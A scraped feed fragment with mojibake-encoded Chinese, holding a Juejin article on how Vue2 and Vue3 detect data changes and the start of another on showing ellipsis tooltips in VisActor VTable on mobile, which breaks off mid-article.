</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueå˜åŒ–å“åº”]]></title>    <link>https://juejin.cn/post/7592531796039794722</link>    <guid>https://juejin.cn/post/7592531796039794722</guid>    <pubDate>2026-01-07T13:45:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796039794722" data-draft-id="7592276645361991680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueå˜åŒ–å“åº”"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T13:45:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€æ ‘å±±èŒ¶"/> <meta itemprop="url" content="https://juejin.cn/user/3200024337714491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueå˜åŒ–å“åº”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3200024337714491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€æ ‘å±±èŒ¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:45:59.000Z" title="Wed Jan 07 2026 13:45:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å“åº”å¼ä¾¦æµ‹</h2>
<h3 data-id="heading-1">1. å¯¹è±¡ä¾¦æµ‹</h3>
<h4 data-id="heading-2">Vue2 å®ç°æ–¹å¼</h4>
<p>Vue2 ä½¿ç”¨Â <code>Object.defineProperty</code>Â æ¥æ£€æµ‹å¯¹è±¡çš„å˜åŒ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> car = {}
<span class="hljs-keyword">let</span> val = <span class="hljs-number">3000</span>

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(car, <span class="hljs-string">'price'</span>, {
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'priceå±æ€§è¢«è¯»å–äº†'</span>)
    <span class="hljs-keyword">return</span> val
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'priceå±æ€§è¢«ä¿®æ”¹äº†'</span>)
    val = newVal
  }
})
</code></pre>
<p>Vue2 é€šè¿‡é€’å½’çš„Â <code>Observer</code>Â å°†å¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§è½¬æ¢ä¸ºå¯è§‚æµ‹å¯¹è±¡<br/>
åœ¨ getter ä¸­æ”¶é›†ä¾èµ–ï¼Œåœ¨ setter ä¸­é€šçŸ¥ä¾èµ–æ›´æ–°</p>
<p><strong>ä¾èµ–</strong>ï¼šæ•°æ®å˜åŒ–çš„æ—¶å€™ä¼šå»é€šçŸ¥è§†å›¾ï¼Œä½†æ˜¯ä¸èƒ½å…¨å±€å»é€šçŸ¥ï¼Œæ‰€ä»¥è¦æ”¶é›†è°ä½¿ç”¨äº†è¿™ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè°ï¼Œå°±æ˜¯ä¾èµ–</p>
<p>åœ¨vueä¸­ï¼Œè°å¾—åˆ°æ•°æ®è°å°±æ˜¯ä¾èµ–ï¼Œä¼šç»™è°åˆ›å»ºä¸€ä¸ªWaterå®ä¾‹ï¼Œç”¨è¿™ä¸ªå®ä¾‹æ¥ä»£è¡¨ä¾èµ–ï¼Œç”±Waterå»é€šçŸ¥çœŸæ­£çš„ä¾èµ–ï¼Œä¸Šæ–¹é‚£ä¸ªupdateå°±æ˜¯Waterçš„ä¸œè¥¿</p>
<p>vueåœ¨getteré‡Œé¢æ”¶é›†ä¾èµ–ï¼Œåœ¨setteré‡Œé¢é€šçŸ¥ä¾èµ–å»è¿›è¡Œæ›´æ–°<br/>
vueä¸ºæ¯ä¸ªæ•°æ®éƒ½å»ºç«‹äº†ä¸€ä¸ªä¾èµ–ç®¡ç†å™¨ï¼ŒæŠŠè¿™ä¸ªæ•°æ®çš„æ‰€æœ‰ä¾èµ–éƒ½ç®¡ç†èµ·æ¥</p>
<p><strong>ä¾èµ–ç®¡ç†å™¨å®ç°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¾èµ–ç®¡ç†å™¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dep</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span> = []
  }
  
  <span class="hljs-title function_">addSub</span>(<span class="hljs-params">sub</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">push</span>(sub)
  }
  
  <span class="hljs-title function_">removeSub</span>(<span class="hljs-params">sub</span>) {
    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">indexOf</span>(sub)
    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>)
    }
  }
  
  <span class="hljs-title function_">depend</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">target</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addSub</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">target</span>)
    }
  }
  
  <span class="hljs-title function_">notify</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> subs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">slice</span>()
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>, l = subs.<span class="hljs-property">length</span>; i &lt; l; i++) {
      subs[i].<span class="hljs-title function_">update</span>() <span class="hljs-comment">// é€šçŸ¥ä¾èµ–æ›´æ–°</span>
    }
  }
}
</code></pre>
<p><strong>æµç¨‹ï¼š</strong></p>
<p>æ•°æ®é€šè¿‡ç›‘å¬å™¨è½¬æ¢æˆæ‹¥æœ‰ getter å’Œ setter çš„å½¢å¼<br/>
å¤–ç•Œé€šè¿‡ Watcher è¯»å–æ•°æ®ï¼Œè§¦å‘ getter å°† Watcher æ·»åŠ åˆ°ä¾èµ–æ•°ç»„<br/>
æ•°æ®å˜åŒ–æ—¶ï¼Œsetter è°ƒç”¨ Watcherï¼ˆä¾èµ–ï¼‰å‘é€é€šçŸ¥<br/>
Watcher æœ€ç»ˆé€šçŸ¥å¤–ç•Œï¼Œå¼•å‘è§†å›¾æ›´æ–°æˆ–å…¶ä»–æ“ä½œ</p>
<h4 data-id="heading-3">Vue3 å®ç°æ–¹å¼</h4>
<p>Vue3 ä½¿ç”¨Â <code>Proxy</code>Â æ¥æ£€æµ‹å˜åŒ–ã€‚</p>
<ul>
<li>å¯ä»¥ç›´æ¥ç›‘å¬æ•´ä¸ªå¯¹è±¡ï¼Œæ— éœ€é€’å½’éå†</li>
<li>å¯ä»¥ç›‘å¬æ–°å¢å’Œåˆ é™¤çš„å±æ€§</li>
<li>æ€§èƒ½æ›´å¥½</li>
</ul>
<h3 data-id="heading-4">2. æ•°ç»„ä¾¦æµ‹</h3>
<h4 data-id="heading-5">Vue2 å®ç°æ–¹å¼</h4>
<p>æ•°ç»„æ— æ³•ç›´æ¥ä½¿ç”¨Â <code>Object.defineProperty</code>Â è¿›è¡Œä¾¦æµ‹ã€‚</p>
<ol>
<li>å°è£…æ•°ç»„çš„åŸç”Ÿæ–¹æ³•ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«ä¾¦æµ‹</li>
<li>ä½¿ç”¨å˜å¼‚æ–¹æ³•ï¼ˆmutator methodsï¼‰æ¥è§¦å‘æ›´æ–°</li>
</ol>
<p><code>Array</code>åŸå‹ä¸­å¯ä»¥æ”¹å˜æ•°ç»„è‡ªèº«å†…å®¹çš„æ–¹æ³•æœ‰7ä¸ªï¼Œåˆ†åˆ«æ˜¯<code>push</code>,<code>pop</code>,<code>shift</code>,<code>unshift</code>,<code>splice</code>,<code>sort</code>,<code>reverse</code></p>
<p><strong>å®ç°åŸç†ï¼š</strong></p>
<ul>
<li>åˆ›å»ºç»§æ‰¿è‡ªÂ <code>Array.prototype</code>Â çš„æ–°å¯¹è±¡</li>
<li>é‡å†™ä¸Šè¿°7ä¸ªæ–¹æ³•ï¼Œåœ¨è°ƒç”¨åŸç”Ÿæ–¹æ³•åæ‰‹åŠ¨è§¦å‘æ›´æ–°é€šçŸ¥</li>
<li>æ•°ç»„ä¾ç„¶ä½¿ç”¨ getter æ”¶é›†ä¾èµ–ï¼Œä½†é€šè¿‡å°è£…çš„æ•°ç»„æ–¹æ³•æ„ŸçŸ¥å˜åŒ–</li>
</ul>
<p>ä¸è¶³çš„åœ°æ–¹åœ¨äºï¼Œé€šè¿‡ä¸‹æ ‡æ“ä½œçš„æ—¶å€™ï¼Œvueæ— æ³•ç›‘å¬åˆ°ï¼Œæ‰€ä»¥vueæä¾›äº†Vue.setå’ŒVue.deleteè¿™å‡ ä¸ªæ–¹æ³•</p>
<h4 data-id="heading-6">Vue3 å®ç°æ–¹å¼</h4>
<p>Vue3 ä½¿ç”¨Â <code>Proxy</code>Â å¯ä»¥ç›‘å¬åˆ°æ•°ç»„çš„æ‰€æœ‰å˜åŒ–ã€‚</p>
<ul>
<li>å¯ä»¥ç›´æ¥ç›‘å¬æ•°ç»„ä¸‹æ ‡æ“ä½œ</li>
<li>å¯ä»¥ç›‘å¬æ•°ç»„é•¿åº¦çš„å˜åŒ–</li>
<li>æ— éœ€ç‰¹æ®Šå¤„ç†æ•°ç»„æ–¹æ³•</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> array = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(array, {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value, receiver</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ•°ç»„çš„<span class="hljs-subst">${property}</span>å±æ€§è¢«ä¿®æ”¹ä¸º<span class="hljs-subst">${value}</span>`</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value, receiver)
  }
})
</code></pre>
<h3 data-id="heading-7">æ€»ç»“å¯¹æ¯”</h3>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Vue2 (Object.defineProperty)</th><th>Vue3 (Proxy)</th></tr></thead><tbody><tr><td>å¯¹è±¡ç›‘å¬</td><td>éœ€è¦é€’å½’éå†å¯¹è±¡å±æ€§</td><td>ç›´æ¥ç›‘å¬æ•´ä¸ªå¯¹è±¡</td></tr><tr><td>æ–°å¢å±æ€§</td><td>æ— æ³•è‡ªåŠ¨ä¾¦æµ‹ï¼Œéœ€è¦Vue.set</td><td>è‡ªåŠ¨ä¾¦æµ‹</td></tr><tr><td>åˆ é™¤å±æ€§</td><td>æ— æ³•è‡ªåŠ¨ä¾¦æµ‹ï¼Œéœ€è¦Vue.delete</td><td>è‡ªåŠ¨ä¾¦æµ‹</td></tr><tr><td>æ•°ç»„ç›‘å¬</td><td>é‡å†™7ä¸ªæ•°ç»„æ–¹æ³•</td><td>ç›´æ¥ç›‘å¬æ‰€æœ‰å˜åŒ–</td></tr><tr><td>æ•°ç»„ä¸‹æ ‡æ“ä½œ</td><td>æ— æ³•ä¾¦æµ‹</td><td>å¯ä»¥ä¾¦æµ‹</td></tr><tr><td>æ€§èƒ½</td><td>é€’å½’åˆå§‹åŒ–æˆæœ¬é«˜</td><td>æƒ°æ€§ç›‘å¬ï¼Œæ€§èƒ½æ›´å¥½</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡]]></title>    <link>https://juejin.cn/post/7592438587389804582</link>    <guid>https://juejin.cn/post/7592438587389804582</guid>    <pubDate>2026-01-07T14:11:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592438587389804582" data-draft-id="7592455394062286886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T14:11:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="pimkle"/> <meta itemprop="url" content="https://juejin.cn/user/4177799914731624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4177799914731624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    pimkle
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:11:21.000Z" title="Wed Jan 07 2026 14:11:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å‰è¨€ï¼š</p>
<p>ä¸ºäº†ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</p>
<p>VTable å†…éƒ¨åœ¨ç§»åŠ¨ç«¯æ•…æ„å±è”½äº†çœç•¥å·æ°”æ³¡çš„å±•ç¤º</p>
<p>æœ¬æ–‡æ—¨åœ¨æä¾›ç›¸å¯¹ä½“éªŒè¾ƒå¥½çš„ç§»åŠ¨ç«¯çš„ ellipsis æ°”æ³¡å±•ç¤ºå®Œæ•´ä¿¡æ¯çš„è§£å†³æ–¹æ¡ˆ</p>
</blockquote>
<h2 data-id="heading-0">1. é…ç½®å¥½ refï¼Œä»¥ä¾›å¼•ç”¨</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">VTable</span>
      <span class="hljs-attr">:id</span>=<span class="hljs-string">"uid"</span>
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"tableRef"</span>
      <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span>
    /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tableRef = <span class="hljs-title function_">ref</span>();
</code></pre>
<h2 data-id="heading-1">2. åˆ¤æ–­å½“å‰ cell æ˜¯å¦æ˜¯æº¢å‡ºçš„</h2>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCellTextOverflow</span>(<span class="hljs-params">tableInstance: <span class="hljs-built_in">any</span>, col: <span class="hljs-built_in">number</span>, row: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// getCellOverflowText è¿”å›éç©ºå­—ç¬¦ä¸²è¯´æ˜æœ‰æº¢å‡º</span>
  <span class="hljs-keyword">const</span> overflowText = tableInstance.<span class="hljs-title function_">getCellOverflowText</span>(col, row);
  <span class="hljs-keyword">return</span> !!overflowText;
}
</code></pre>
<h2 data-id="heading-2">3. å±•ç¤ºæ°”æ³¡</h2>
<p>æœ‰ 2 ç§æ–¹æ¡ˆï¼Œä¼˜ç¼ºç‚¹æ¯”è¾ƒå¦‚ä¸‹è¡¨ï¼š</p>




















<table><thead><tr><th>æ°”æ³¡æ–¹æ¡ˆ</th><th>VTable åŸç”Ÿæ°”æ³¡</th><th>è‡ªå®šä¹‰æ°”æ³¡</th></tr></thead><tbody><tr><td>ä¼˜ç‚¹</td><td>é…ç½®ç®€å• <br/> å‡ºç°çš„ä½ç½®ä¸éœ€è¦å¤§é‡è®¡ç®—</td><td>é•¿çš„å¥½çœ‹ <br/> ç”¨æˆ·æ“ä½œçµæ´» ç‚¹å‡»æ»šåŠ¨ç­‰å°±ä¼šåŠæ—¶æ¶ˆå¤±</td></tr><tr><td>ç¼ºç‚¹</td><td>æ ·å¼ä¸‘ <br/> ç”¨æˆ·æ“ä½œä¸çµæ´»ï¼Œä¸ä¼šåŠæ—¶æ¶ˆå¤±</td><td>é…ç½®ç¹ç</td></tr></tbody></table>
<h3 data-id="heading-3">3.1 VTable åŸç”Ÿæ°”æ³¡</h3>
<h4 data-id="heading-4">3.1.1 å¼€å¯ tooltip å¼€å…³</h4>
<p>å¦‚æœå¯ä»¥åœ¨åˆå§‹åŒ–é…ç½® <code>VTable</code> çš„ <code>config</code> çš„è¯
